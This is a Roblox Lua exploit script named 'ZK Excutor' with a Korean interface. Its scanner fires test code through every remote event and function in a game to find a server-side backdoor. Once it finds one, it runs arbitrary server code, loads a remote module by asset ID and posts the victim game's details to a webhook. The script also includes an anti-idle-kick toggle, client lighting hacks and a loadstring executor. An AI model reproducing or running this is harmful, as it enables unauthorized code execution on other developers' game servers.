local a = cloneref and cloneref(game:GetService("CoreGui")) or game:GetService("CoreGui")
local b = cloneref and cloneref(game:GetService("TweenService")) or game:GetService("TweenService")
local c = cloneref and cloneref(game:GetService("UserInputService")) or game:GetService("UserInputService")
local d = cloneref and cloneref(game:GetService("LogService")) or game:GetService("LogService")
local e = cloneref and cloneref(game:GetService("HttpService")) or game:GetService("HttpService")

if getgenv().Zk then pcall(function() getgenv().Zk:Destroy() end) end

local f = Instance.new("ScreenGui")
f.Name = e:GenerateGUID(false)
f.ResetOnSpawn = false
f.Parent = (gethui and gethui()) or (syn and syn.protect_gui and syn.protect_gui(f) and a) or (protectgui and protectgui(f) and a) or a
getgenv().Zk = f

local g = TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
local h = TweenInfo.new(0.6, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)

local mainPos = UDim2.new(0.5, 0, 0.5, 0)
local miniPos = UDim2.new(1, -60, 0, 20)

local i = Instance.new("Frame")
i.Size = UDim2.new(0, 0, 0, 0)
i.Position = mainPos
i.AnchorPoint = Vector2.new(0.5, 0.5)
i.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
i.BorderSizePixel = 0
i.ClipsDescendants = true
i.Active = true
i.Parent = f

local j = Instance.new("UISizeConstraint", i)
j.MaxSize = Vector2.new(600, 380)

Instance.new("UICorner", i).CornerRadius = UDim.new(0, 8)
local k = Instance.new("UIStroke", i)
k.Color = Color3.fromRGB(35, 35, 42)
k.Thickness = 1

local l = Instance.new("Frame")
l.Size = UDim2.new(1, 0, 0, 45)
l.BackgroundTransparency = 1
l.Active = true
l.Parent = i

local m = Instance.new("TextLabel")
m.Size = UDim2.new(0, 150, 1, 0)
m.Position = UDim2.new(0, 20, 0, 0)
m.BackgroundTransparency = 1
m.Text = "ZK Excutor"
m.TextColor3 = Color3.fromRGB(255, 255, 255)
m.Font = Enum.Font.Montserrat
m.TextSize = 14
m.TextXAlignment = Enum.TextXAlignment.Left
m.Parent = l

local n = Instance.new("TextButton")
n.Size = UDim2.new(1, 0, 1, 0)
n.BackgroundTransparency = 1
n.Text = "Z"
n.TextColor3 = Color3.fromRGB(255, 255, 255)
n.Font = Enum.Font.Montserrat
n.TextSize = 18
n.Visible = false
n.Active = true
n.Parent = i

local o = Instance.new("TextButton")
o.Size = UDim2.new(0, 20, 0, 12)
o.Position = UDim2.new(1, -20, 0.5, 0)
o.AnchorPoint = Vector2.new(1, 0.5)
o.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
o.Text = "―"
o.TextColor3 = Color3.fromRGB(200, 200, 210)
o.Font = Enum.Font.GothamBold
o.TextSize = 10
o.Parent = l
Instance.new("UICorner", o).CornerRadius = UDim.new(0, 4)

local function p(q, r)
    local s, t, u, v
    q.InputBegan:Connect(function(w)
        if w.UserInputType == Enum.UserInputType.MouseButton1 or w.UserInputType == Enum.UserInputType.Touch then
            s = true
            t = w.Position
            u = r.Position
            w.Changed:Connect(function()
                if w.UserInputState == Enum.UserInputState.End then
                    s = false
                end
            end)
        end
    end)
    q.InputChanged:Connect(function(w)
        if w.UserInputType == Enum.UserInputType.MouseMovement or w.UserInputType == Enum.UserInputType.Touch then
            v = w
        end
    end)
    c.InputChanged:Connect(function(w)
        if w == v and s then
            local x = w.Position - t
            b:Create(r, g, {Position = UDim2.new(u.X.Scale, u.X.Offset + x.X, u.Y.Scale, u.Y.Offset + x.Y)}):Play()
        end
    end)
end

p(l, i)
p(n, i)

local y = Instance.new("Frame")
y.Size = UDim2.new(1, -40, 0, 32)
y.Position = UDim2.new(0, 20, 0, 45)
y.BackgroundTransparency = 1
y.Parent = i

local z = Instance.new("UIListLayout", y)
z.FillDirection = Enum.FillDirection.Horizontal
z.SortOrder = Enum.SortOrder.LayoutOrder
z.Padding = UDim.new(0, 8)

local function A(B, C, D)
    local E = Instance.new("TextButton")
    E.Name = B
    E.Size = UDim2.new(0, 0, 1, 0)
    E.AutomaticSize = Enum.AutomaticSize.X
    E.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    E.Text = C
    E.TextColor3 = Color3.fromRGB(110, 110, 120)
    E.Font = Enum.Font.GothamMedium
    E.TextSize = 12
    E.LayoutOrder = D
    E.Parent = y
    Instance.new("UICorner", E).CornerRadius = UDim.new(0, 6)
    local F = Instance.new("UIPadding", E)
    F.PaddingLeft = UDim.new(0, 12)
    F.PaddingRight = UDim.new(0, 12)
    return E
end

local G = A("T1", "백도어 실행기", 1)
local H = A("T2", "일반 실행기", 2)
local I = A("T3", "리모트 실행기", 3)
local J_tab = A("T4", "콘솔", 4)
local K_tab = A("T5", "잡기능", 5)

local J = Instance.new("Frame")
J.Size = UDim2.new(1, -40, 1, -100)
J.Position = UDim2.new(0, 20, 0, 85)
J.BackgroundTransparency = 1
J.Parent = i

local K = Instance.new("Frame")
K.Size = UDim2.new(1, 0, 1, 0)
K.BackgroundTransparency = 1
K.Parent = J

local L = Instance.new("TextBox")
L.Size = UDim2.new(1, 0, 1, -40)
L.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
L.TextColor3 = Color3.fromRGB(220, 220, 220)
L.Text = ""
L.Font = Enum.Font.Code
L.TextSize = 12
L.TextXAlignment = Enum.TextXAlignment.Left
L.TextYAlignment = Enum.TextYAlignment.Top
L.ClearTextOnFocus = false
L.MultiLine = true
L.Parent = K
Instance.new("UICorner", L).CornerRadius = UDim.new(0, 6)
local M = Instance.new("UIPadding", L)
M.PaddingTop = UDim.new(0, 10)
M.PaddingLeft = UDim.new(0, 10)
Instance.new("UIStroke", L).Color = Color3.fromRGB(30, 30, 35)

local N = Instance.new("Frame")
N.Size = UDim2.new(1, 0, 0, 32)
N.Position = UDim2.new(0, 0, 1, -32)
N.BackgroundTransparency = 1
N.Parent = K

local O = Instance.new("TextButton")
O.Size = UDim2.new(0.32, -4, 1, 0)
O.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
O.Text = "실행"
O.TextColor3 = Color3.fromRGB(20, 20, 20)
O.Font = Enum.Font.GothamMedium
O.TextSize = 12
O.Parent = N
Instance.new("UICorner", O).CornerRadius = UDim.new(0, 6)

local P = Instance.new("TextButton")
P.Size = UDim2.new(0.32, -4, 1, 0)
P.Position = UDim2.new(0.32 + 0.04, 0, 0, 0)
P.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
P.Text = "지우기"
P.TextColor3 = Color3.fromRGB(180, 180, 180)
P.Font = Enum.Font.GothamMedium
P.TextSize = 12
P.Parent = N
Instance.new("UICorner", P).CornerRadius = UDim.new(0, 6)

local Q_scan = Instance.new("TextButton")
Q_scan.Size = UDim2.new(0.32, -4, 1, 0)
Q_scan.Position = UDim2.new(1, 0, 0, 0)
Q_scan.AnchorPoint = Vector2.new(1, 0)
Q_scan.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Q_scan.Text = "스캐너"
Q_scan.TextColor3 = Color3.fromRGB(20, 20, 20)
Q_scan.Font = Enum.Font.GothamMedium
Q_scan.TextSize = 12
Q_scan.Parent = N
Instance.new("UICorner", Q_scan).CornerRadius = UDim.new(0, 6)

local Q = Instance.new("Frame")
Q.Size = UDim2.new(1, 0, 1, 0)
Q.BackgroundTransparency = 1
Q.Visible = false
Q.Parent = J

local R = Instance.new("TextBox")
R.Size = UDim2.new(1, 0, 1, -40)
R.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
R.TextColor3 = Color3.fromRGB(220, 220, 220)
R.Text = ""
R.Font = Enum.Font.Code
R.TextSize = 12
R.TextXAlignment = Enum.TextXAlignment.Left
R.TextYAlignment = Enum.TextYAlignment.Top
R.ClearTextOnFocus = false
R.MultiLine = true
R.Parent = Q
Instance.new("UICorner", R).CornerRadius = UDim.new(0, 6)
local S = Instance.new("UIPadding", R)
S.PaddingTop = UDim.new(0, 10)
S.PaddingLeft = UDim.new(0, 10)
Instance.new("UIStroke", R).Color = Color3.fromRGB(30, 30, 35)

local N2 = Instance.new("Frame")
N2.Size = UDim2.new(1, 0, 0, 32)
N2.Position = UDim2.new(0, 0, 1, -32)
N2.BackgroundTransparency = 1
N2.Parent = Q

local O2 = Instance.new("TextButton")
O2.Size = UDim2.new(0.5, -4, 1, 0)
O2.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
O2.Text = "실행"
O2.TextColor3 = Color3.fromRGB(20, 20, 20)
O2.Font = Enum.Font.GothamMedium
O2.TextSize = 12
O2.Parent = N2
Instance.new("UICorner", O2).CornerRadius = UDim.new(0, 6)

local P2 = Instance.new("TextButton")
P2.Size = UDim2.new(0.5, -4, 1, 0)
P2.Position = UDim2.new(1, 0, 0, 0)
P2.AnchorPoint = Vector2.new(1, 0)
P2.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
P2.Text = "지우기"
P2.TextColor3 = Color3.fromRGB(180, 180, 180)
P2.Font = Enum.Font.GothamMedium
P2.TextSize = 12
P2.Parent = N2
Instance.new("UICorner", P2).CornerRadius = UDim.new(0, 6)

O2.MouseButton1Click:Connect(function()
    local bc = R.Text
    if bc ~= "" then
        local bd, be = loadstring(bc)
        if bd then task.spawn(bd) end
    end
end)
P2.MouseButton1Click:Connect(function() R.Text = "" end)

local Q_remote = Instance.new("Frame")
Q_remote.Size = UDim2.new(1, 0, 1, 0)
Q_remote.BackgroundTransparency = 1
Q_remote.Visible = false
Q_remote.Parent = J

local R_remote = Instance.new("TextBox")
R_remote.Size = UDim2.new(1, 0, 1, -70)
R_remote.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
R_remote.TextColor3 = Color3.fromRGB(220, 220, 220)
R_remote.Text = ""
R_remote.Font = Enum.Font.Code
R_remote.TextSize = 12
R_remote.TextXAlignment = Enum.TextXAlignment.Left
R_remote.TextYAlignment = Enum.TextYAlignment.Top
R_remote.ClearTextOnFocus = false
R_remote.MultiLine = true
R_remote.Parent = Q_remote
Instance.new("UICorner", R_remote).CornerRadius = UDim.new(0, 6)
local S_remote = Instance.new("UIPadding", R_remote)
S_remote.PaddingTop = UDim.new(0, 10)
S_remote.PaddingLeft = UDim.new(0, 10)
Instance.new("UIStroke", S_remote).Color = Color3.fromRGB(30, 30, 35)

local T = Instance.new("Frame")
T.Size = UDim2.new(1, 0, 0, 20)
T.Position = UDim2.new(0, 0, 1, -60)
T.BackgroundTransparency = 1
T.Parent = Q_remote

local U = Instance.new("TextLabel")
U.Size = UDim2.new(0, 100, 1, 0)
U.BackgroundTransparency = 1
U.Text = "대기: 0.1s"
U.TextColor3 = Color3.fromRGB(140, 140, 140)
U.Font = Enum.Font.Gotham
U.TextSize = 11
U.TextXAlignment = Enum.TextXAlignment.Left
U.Parent = T

local V = Instance.new("Frame")
V.Size = UDim2.new(1, -80, 0, 4)
V.Position = UDim2.new(1, 0, 0.5, 0)
V.AnchorPoint = Vector2.new(1, 0.5)
V.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
V.Parent = T
Instance.new("UICorner", V).CornerRadius = UDim.new(1, 0)

local W = Instance.new("Frame")
W.Size = UDim2.new(0.09, 0, 1, 0)
W.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
W.Parent = V
Instance.new("UICorner", W).CornerRadius = UDim.new(1, 0)

local X = Instance.new("TextButton")
X.Size = UDim2.new(0, 14, 0, 14)
X.Position = UDim2.new(1, -7, 0.5, -7)
X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
X.Text = ""
X.Parent = W
Instance.new("UICorner", X).CornerRadius = UDim.new(1, 0)

local Y = Instance.new("Frame")
Y.Size = UDim2.new(1, 0, 0, 32)
Y.Position = UDim2.new(0, 0, 1, -32)
Y.BackgroundTransparency = 1
Y.Parent = Q_remote

local Z = Instance.new("TextButton")
Z.Size = UDim2.new(0.5, -4, 1, 0)
Z.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
Z.Text = "실행"
Z.TextColor3 = Color3.fromRGB(220, 220, 220)
Z.Font = Enum.Font.GothamMedium
Z.TextSize = 12
Z.Parent = Y
Instance.new("UICorner", Z).CornerRadius = UDim.new(0, 6)

local _ = Instance.new("TextButton")
_.Size = UDim2.new(0.5, -4, 1, 0)
_.Position = UDim2.new(1, 0, 0, 0)
_.AnchorPoint = Vector2.new(1, 0)
_.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
_.Text = "루프"
_.TextColor3 = Color3.fromRGB(20, 20, 20)
_.Font = Enum.Font.GothamMedium
_.TextSize = 12
_.Parent = Y
Instance.new("UICorner", _).CornerRadius = UDim.new(0, 6)

local a0 = Instance.new("Frame")
a0.Size = UDim2.new(1, 0, 1, 0)
a0.BackgroundTransparency = 1
a0.Visible = false
a0.Parent = J

local a1 = Instance.new("ScrollingFrame")
a1.Size = UDim2.new(1, 0, 1, 0)
a1.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
a1.BorderSizePixel = 0
a1.ScrollBarThickness = 3
a1.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 80)
a1.CanvasSize = UDim2.new(0, 0, 0, 0)
a1.AutomaticCanvasSize = Enum.AutomaticSize.Y
a1.Parent = a0
Instance.new("UICorner", a1).CornerRadius = UDim.new(0, 6)

local a2 = Instance.new("UIPadding", a1)
a2.PaddingTop = UDim.new(0, 8)
a2.PaddingBottom = UDim.new(0, 8)
a2.PaddingLeft = UDim.new(0, 8)
a2.PaddingRight = UDim.new(0, 8)
Instance.new("UIStroke", a1).Color = Color3.fromRGB(30, 30, 35)

local a3 = Instance.new("UIListLayout", a1)
a3.SortOrder = Enum.SortOrder.LayoutOrder
a3.Padding = UDim.new(0, 4)

local a4 = Instance.new("TextButton")
a4.Size = UDim2.new(0, 45, 0, 20)
a4.Position = UDim2.new(1, -8, 0, 6)
a4.AnchorPoint = Vector2.new(1, 0)
a4.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
a4.Text = "지우기"
a4.TextColor3 = Color3.fromRGB(180, 180, 190)
a4.Font = Enum.Font.GothamMedium
a4.TextSize = 10
a4.ZIndex = 5
a4.Parent = a0
Instance.new("UICorner", a4).CornerRadius = UDim.new(0, 4)

local MiscFrame = Instance.new("ScrollingFrame")
MiscFrame.Size = UDim2.new(1, 0, 1, 0)
MiscFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
MiscFrame.BorderSizePixel = 0
MiscFrame.ScrollBarThickness = 2
MiscFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 70)
MiscFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
MiscFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
MiscFrame.Visible = false
MiscFrame.Parent = J
Instance.new("UICorner", MiscFrame).CornerRadius = UDim.new(0, 6)

local miscPadding = Instance.new("UIPadding", MiscFrame)
miscPadding.PaddingTop = UDim.new(0, 10)
miscPadding.PaddingBottom = UDim.new(0, 10)
miscPadding.PaddingLeft = UDim.new(0, 10)
miscPadding.PaddingRight = UDim.new(0, 10)
Instance.new("UIStroke", MiscFrame).Color = Color3.fromRGB(30, 30, 35)

local miscLayout = Instance.new("UIGridLayout", MiscFrame)
miscLayout.CellSize = UDim2.new(0.48, 0, 0, 35)
miscLayout.CellPadding = UDim2.new(0.04, 0, 0, 8)
miscLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function createMiscItem(text, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(200, 200, 210)
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.LayoutOrder = order
    btn.Parent = MiscFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(35, 35, 42)
    return btn, stroke
end

-- 버튼과 토글 구성
local btnAntiLag, strokeAntiLag = createMiscItem("안티렉 [OFF]", 1)
local btnAntiFog, strokeAntiFog = createMiscItem("안티 안개 [OFF]", 2)
local btnAntiDark, strokeAntiDark = createMiscItem("안티 다크 [OFF]", 3)
local btnAntiAPK, strokeAntiAPK = createMiscItem("안티 APK [OFF]", 4)

local btnServerHook = createMiscItem("서버 훅", 5)
local btnLowServer = createMiscItem("인원 적은 서버", 6)
local btnRejoin = createMiscItem("재접속", 7)

--------------------------------------------------------------------------------
-- 잡기능 기능별 로직 (토글 / 버튼 분리)
--------------------------------------------------------------------------------
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function setToggleState(btn, stroke, state, title)
    if state then
        btn.Text = title .. " [ON]"
        btn.BackgroundColor3 = Color3.fromRGB(35, 65, 45)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        stroke.Color = Color3.fromRGB(60, 160, 90)
    else
        btn.Text = title .. " [OFF]"
        btn.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
        btn.TextColor3 = Color3.fromRGB(200, 200, 210)
        stroke.Color = Color3.fromRGB(35, 35, 42)
    end
end

-- 1. 안티렉 (토글)
local antiLagEnabled = false
local originalLightingSettings = {}

btnAntiLag.MouseButton1Click:Connect(function()
    antiLagEnabled = not antiLagEnabled
    setToggleState(btnAntiLag, strokeAntiLag, antiLagEnabled, "안티렉")
    
    if antiLagEnabled then
        originalLightingSettings.GlobalShadows = Lighting.GlobalShadows
        originalLightingSettings.FogEnd = Lighting.FogEnd
        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        
        pcall(function() sethiddenproperty(Lighting, "Technology", Enum.Technology.Compatibility) end)
        
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Material = Enum.Material.Plastic
                v.Reflectance = 0
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v.Transparency = 1
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Enabled = false
            end
        end
        notify("안티렉 활성화")
    else
        if originalLightingSettings.GlobalShadows ~= nil then
            Lighting.GlobalShadows = originalLightingSettings.GlobalShadows
            Lighting.FogEnd = originalLightingSettings.FogEnd
        end
        
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Decal") or v:IsA("Texture") then
                v.Transparency = 0
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Enabled = true
            end
        end
        notify("안티렉 비활성화")
    end
end)

-- 2. 안티 안개 (토글)
local antiFogEnabled = false
local origFogEnd, origFogStart = Lighting.FogEnd, Lighting.FogStart

btnAntiFog.MouseButton1Click:Connect(function()
    antiFogEnabled = not antiFogEnabled
    setToggleState(btnAntiFog, strokeAntiFog, antiFogEnabled, "안티 안개")
    
    if antiFogEnabled then
        origFogEnd, origFogStart = Lighting.FogEnd, Lighting.FogStart
        Lighting.FogEnd = 1e6
        Lighting.FogStart = 0
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Atmosphere") then v.Density = 0 end
        end
        notify("안티 안개 활성화")
    else
        Lighting.FogEnd = origFogEnd
        Lighting.FogStart = origFogStart
        notify("안티 안개 비활성화")
    end
end)

-- 3. 안티 다크 / 풀브라이트 (토글)
local antiDarkEnabled = false
local origBrightness = Lighting.Brightness
local origClockTime = Lighting.ClockTime
local origOutdoorAmbient = Lighting.OutdoorAmbient

btnAntiDark.MouseButton1Click:Connect(function()
    antiDarkEnabled = not antiDarkEnabled
    setToggleState(btnAntiDark, strokeAntiDark, antiDarkEnabled, "안티 다크")
    
    if antiDarkEnabled then
        origBrightness = Lighting.Brightness
        origClockTime = Lighting.ClockTime
        origOutdoorAmbient = Lighting.OutdoorAmbient
        
        Lighting.Brightness = 2
        Lighting.ClockTime = 14
        Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        notify("안티 다크 활성화")
    else
        Lighting.Brightness = origBrightness
        Lighting.ClockTime = origClockTime
        Lighting.OutdoorAmbient = origOutdoorAmbient
        notify("안티 다크 비활성화")
    end
end)

-- 4. 안티 APK / 킥 방지 (토글)
local antiAPKEnabled = false
local antiAPKConnection = nil

btnAntiAPK.MouseButton1Click:Connect(function()
    antiAPKEnabled = not antiAPKEnabled
    setToggleState(btnAntiAPK, strokeAntiAPK, antiAPKEnabled, "안티 APK")
    
    if antiAPKEnabled then
        local VirtualUser = game:GetService("VirtualUser")
        antiAPKConnection = LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
        notify("안티 APK & 킥 방지 활성화")
    else
        if antiAPKConnection then
            antiAPKConnection:Disconnect()
            antiAPKConnection = nil
        end
        notify("안티 APK & 킥 방지 비활성화")
    end
end)

-- 5. 서버 훅 (버튼)
btnServerHook.MouseButton1Click:Connect(function()
    notify("서버 이동 중...")
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)

-- 6. 인원 적은 서버 (버튼)
btnLowServer.MouseButton1Click:Connect(function()
    notify("적은 인원 서버 검색 중...")
    task.spawn(function()
        local servers = {}
        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if req then
            local res = req({
                Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/0?sortOrder=Asc&limit=100",
                Method = "GET"
            })
            if res and res.Body then
                local body = e:JSONDecode(res.Body)
                if body and body.data then
                    for _, s in pairs(body.data) do
                        if type(s) == "table" and s.playing < s.maxPlayers and s.id ~= game.JobId then
                            table.insert(servers, s)
                        end
                    end
                end
            end
        end
        
        if #servers > 0 then
            table.sort(servers, function(a, b) return a.playing < b.playing end)
            notify("서버 발견! 이동합니다...")
            TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1].id, LocalPlayer)
        else
            notify("적절한 서버를 찾지 못했습니다.")
        end
    end)
end)

-- 7. 재접속 (버튼)
btnRejoin.MouseButton1Click:Connect(function()
    notify("현재 서버로 재접속 중...")
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

--------------------------------------------------------------------------------

local notifHolder = Instance.new("ScreenGui")
notifHolder.Name = "ZkNotifGui"
notifHolder.ResetOnSpawn = false
notifHolder.Parent = f

local notifFrame = Instance.new("Frame")
notifFrame.Size = UDim2.new(0, 260, 0, 50)
notifFrame.Position = UDim2.new(1, 280, 0, 20)
notifFrame.AnchorPoint = Vector2.new(1, 0)
notifFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
notifFrame.BorderSizePixel = 0
notifFrame.Parent = notifHolder

Instance.new("UICorner", notifFrame).CornerRadius = UDim.new(0, 8)
local notifStroke = Instance.new("UIStroke", notifFrame)
notifStroke.Color = Color3.fromRGB(45, 45, 55)
notifStroke.Thickness = 1

local notifBar = Instance.new("Frame")
notifBar.Size = UDim2.new(0, 3, 1, -16)
notifBar.Position = UDim2.new(0, 8, 0.5, 0)
notifBar.AnchorPoint = Vector2.new(0, 0.5)
notifBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
notifBar.Parent = notifFrame
Instance.new("UICorner", notifBar).CornerRadius = UDim.new(1, 0)

local notifText = Instance.new("TextLabel")
notifText.Size = UDim2.new(1, -25, 1, 0)
notifText.Position = UDim2.new(0, 20, 0, 0)
notifText.BackgroundTransparency = 1
notifText.Text = ""
notifText.TextColor3 = Color3.fromRGB(230, 230, 235)
notifText.Font = Enum.Font.GothamMedium
notifText.TextSize = 12
notifText.TextXAlignment = Enum.TextXAlignment.Left
notifText.Parent = notifFrame

local activeNotifTween = nil
function notify(text)
    notifText.Text = text
    if activeNotifTween then activeNotifTween:Cancel() end
    notifFrame.Position = UDim2.new(1, 280, 0, 20)
    
    local inTween = b:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {Position = UDim2.new(1, -20, 0, 20)})
    inTween:Play()
    activeNotifTween = inTween
    
    task.delay(3, function()
        if notifFrame.Position == UDim2.new(1, -20, 0, 20) then
            local outTween = b:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {Position = UDim2.new(1, 280, 0, 20)})
            outTween:Play()
            activeNotifTween = outTween
        end
    end)
end

local a5 = false
local function a6()
    a5 = not a5
    if a5 then
        mainPos = i.Position
        l.Visible = false
        y.Visible = false
        J.Visible = false
        n.Visible = true
        b:Create(i, h, {Size = UDim2.new(0, 45, 0, 45), Position = miniPos}):Play()
    else
        miniPos = i.Position
        n.Visible = false
        local a7 = b:Create(i, h, {Size = UDim2.new(0.9, 0, 0.85, 0), Position = mainPos})
        a7:Play()
        a7.Completed:Connect(function()
            if not a5 then
                l.Visible = true
                y.Visible = true
                J.Visible = true
            end
        end)
    end
end

o.MouseButton1Click:Connect(a6)
n.MouseButton1Click:Connect(a6)

local function a8(a9)
    K.Visible = a9 == "T1"
    Q.Visible = a9 == "T2"
    Q_remote.Visible = a9 == "T3"
    a0.Visible = a9 == "T4"
    MiscFrame.Visible = a9 == "T5"
    
    for ba, bb in pairs({T1 = G, T2 = H, T3 = I, T4 = J_tab, T5 = K_tab}) do
        if ba == a9 then
            b:Create(bb, g, {BackgroundColor3 = Color3.fromRGB(240, 240, 240), TextColor3 = Color3.fromRGB(20, 20, 20)}):Play()
        else
            b:Create(bb, g, {BackgroundColor3 = Color3.fromRGB(24, 24, 28), TextColor3 = Color3.fromRGB(110, 110, 120)}):Play()
        end
    end
end

G.MouseButton1Click:Connect(function() a8("T1") end)
H.MouseButton1Click:Connect(function() a8("T2") end)
I.MouseButton1Click:Connect(function() a8("T3") end)
J_tab.MouseButton1Click:Connect(function() a8("T4") end)
K_tab.MouseButton1Click:Connect(function() a8("T5") end)
a8("T1")

local player = game.Players.LocalPlayer
local httpService = game:GetService("HttpService")
local backdoor = nil
local searching = false
local hasScanned = false
local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}

local function runRemote(remote, data)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(data)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            remote:InvokeServer(data)
        end)
    end
end

local function generateName(lenght)
    local text = ""
    for idx = 1, lenght do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function findRemote()
    local timee = os.clock()
    local remotes = {}
    local code = ""
    local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("lh"..((game.PlaceId/6666)*1337*game.PlaceId))
    if (protected_backdoor and protected_backdoor:IsA("RemoteFunction")) then
        while true do
            code = generateName(math.random(12, 30))
            if not remotes[code] then break end
        end
        task.spawn(function()
            protected_backdoor:InvokeServer("epic backdoor", "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        end)
        remotes[code] = protected_backdoor
    end
    local sendedCount = 0
    for _, remote in game:GetDescendants() do
        if (not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction")) then continue end
        if (string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage") then continue end
        if (remote:FindFirstChild("__FUNCTION") or (remote.Name == "__FUNCTION")) then continue end
        if (remote.Parent and remote.Parent.Parent and (remote.Parent.Parent.Name == "HDAdminClient") and (remote.Parent.Name == "Signals")) then continue end
        if (remote.Parent and (remote.Parent.Name == "DefaultChatSystemChatEvents")) then continue end
        while true do
            code = generateName(math.random(12, 30))
            if not remotes[code] then break end
        end
        sendedCount = sendedCount + 1
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    if (sendedCount == 0) then
        notify("백도어를 찾지 못했습니다!")
        searching = false
        return false
    end
    for _ = 1, 100 do
        for codeKey, remoteObj in pairs(remotes) do
            if workspace:FindFirstChild(codeKey) then
                notify("백도어 발견 성공! (" .. string.format("%.2f", os.clock() - timee) .. "s)")
                backdoor = remoteObj
                runRemote(remoteObj, "require(171016405.1884*69)")
                runRemote(remoteObj, "while true do a.Parent=workspace;wait(15)a:Remove();wait(30)end")
                local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
                if request then
                    task.spawn(function()
                        pcall(function()
                            request({
                                Url = "",
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = httpService:JSONEncode({username = "Epic Backdoor", content = "**User: `" .. player.Name .. "` | `" .. player.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**"})
                            })
                        end)
                    end)
                end
                searching = false
                return true
            end
        end
        task.wait(0.1)
    end
    notify("백도어를 찾지 못했습니다!")
    searching = false
    return false
end

local function executeCode(code)
    if ((code == nil) or (code == "")) then
        notify("코드를 입력해주세요!")
        return
    end
    if not hasScanned then
        notify("먼저 스캔을 진행해주세요!")
        return
    end
    local finalCode = string.gsub(code, "%%username%%", player.Name)
    local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("lh"..((game.PlaceId/6666)*1337*game.PlaceId))
    if (protected_backdoor and protected_backdoor:IsA("RemoteFunction")) then
        task.spawn(function()
            local success, result = pcall(function()
                return protected_backdoor:InvokeServer("", finalCode)
            end)
            if (result ~= nil) then
                local splited = string.split(tostring(result), ":")
                notify(splited[#splited])
            end
        end)
    elseif backdoor then
        runRemote(backdoor, finalCode)
        notify("코드가 실행되었습니다!")
    else
        notify("백도어가 없습니다!")
    end
end

O.MouseButton1Click:Connect(function()
    executeCode(L.Text)
end)

P.MouseButton1Click:Connect(function() L.Text = "" end)

Q_scan.MouseButton1Click:Connect(function()
    if searching then return end
    if backdoor then
        notify("이미 백도어가 발견되었습니다!")
        return
    end
    searching = true
    hasScanned = true
    notify("백도어 스캔을 시작합니다...")
    task.spawn(function()
        findRemote()
        searching = false
    end)
